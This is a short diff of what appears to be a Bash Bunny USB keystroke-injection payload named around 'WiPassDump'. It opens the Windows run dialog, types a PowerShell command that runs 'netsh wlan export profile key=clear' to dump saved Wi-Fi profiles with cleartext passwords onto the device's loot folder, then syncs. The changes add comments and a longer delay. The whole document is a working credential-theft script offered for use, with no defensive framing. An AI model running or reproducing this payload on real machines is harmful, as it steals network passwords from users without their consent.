@@ -26,22 +26,22 @@ mkdir -p /root/udisk/loot/WiPassDump
 
 LED R 200
 
+# Open windows run console
+
 Q GUI r
 Q DELAY 1000
+
+# enter payload and execute
+
 Q STRING powershell \$bunny\=\(gwmi win32_volume -f \'label=\\\"BashBunny\\\"\'\).NAME\; cd \$bunny\\loot\\WiPassDump\; netsh wlan export profile key=clear
 Q ENTER
 
-LED B
+#Let code run, then sync
 
-Q DELAY 1000;
-#Q STRING cd \$bunny\\loot\\WiPassDump\; netsh wlan export profile key=clear
-#Q ENTER
-#Q DELAY 500
-
-#exit
-#Q STRING exit
-#Q ENTER
+Q DELAY 5000
 
 sync
+
+# Done!
 
 LED G
